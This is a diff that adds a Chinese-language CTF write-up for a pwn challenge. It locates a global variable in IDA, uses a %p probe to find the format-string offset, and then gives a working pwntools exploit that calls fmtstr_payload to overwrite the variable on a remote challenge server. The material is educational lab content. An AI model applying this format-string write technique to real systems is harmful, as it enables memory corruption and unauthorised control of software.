@@ -66,6 +66,53 @@ retn                         ; 弹出 esp 指向的地址到 EIP
 > [!check] 正解
 > 使用格式化字符串修改 `num`
 
-```python
+首先我们需要确定 `num` 的地址，用IDA可以看
+```
+.bss:0804A030                                   public num
+```
 
+然后，我们需要确定 `offset` ，这样 `printf` 才能识别目标地址
+```python
+from pwn import *
+
+context.terminal = ['gnome-terminal', '--', 'sh', '-c']
+context.arch = 'i386'
+context.log_level = 'debug'
+context.gdb_binary = 'pwndbg'
+
+elf = ELF("./pwn")
+
+p = process(['./pwn'])
+
+payload = b"AAAA-%p-%p-%p-%p-%p-%p-%p-%p-%p-%p"
+
+p.sendline(payload)
+p.interactive()
+```
+![[Pasted image 20260417190536.png]]
+所以我们想要的 `offset` 是 7
+
+我们想要写入的值是 `16`
+
+ok，我们已经收集完需要的信息，开始写 exploit
+```python
+from pwn import *
+
+context.terminal = ['gnome-terminal', '--', 'sh', '-c']
+context.arch = 'i386'
+context.log_level = 'debug'
+context.gdb_binary = 'pwndbg'
+
+elf = ELF("./pwn")
+
+# p = process(['./pwn'])
+p = remote('pwn.challenge.ctf.show', 28155)
+
+offset = 7
+writes = {0x0804A030: 16}
+
+payload = fmtstr_payload(offset, writes)
+
+p.sendline(payload)
+p.interactive()
 ```
